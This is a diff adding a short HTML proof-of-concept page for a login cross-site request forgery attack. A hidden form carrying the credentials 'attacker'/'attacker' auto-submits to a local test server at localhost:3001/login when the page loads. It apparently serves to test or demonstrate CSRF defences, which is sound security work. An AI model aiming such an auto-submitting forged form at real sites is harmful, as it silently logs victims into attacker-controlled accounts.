@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form action="http://localhost:3001/login" method="POST">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="attacker" />
+    <input type="submit" value="Submit CSRF">
+  </form>
+  <script>document.forms[0].submit();</script>
+</body>
+</html>
